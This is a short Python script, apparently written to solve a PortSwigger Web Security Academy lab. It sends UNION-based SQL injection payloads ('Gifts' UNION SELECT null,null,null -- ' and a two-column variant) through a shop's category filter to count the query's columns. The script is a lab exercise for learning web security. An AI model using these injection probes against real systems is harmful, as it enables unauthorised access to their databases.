import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

site = 'ac911f231ef74013c0d45cba00870007.web-security-academy.net'


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()

#This will tell us how how many columns we have
try_category("""Gifts' UNION SELECT null,null,null -- """)
try_category("""Gifts' UNION SELECT null,null -- """)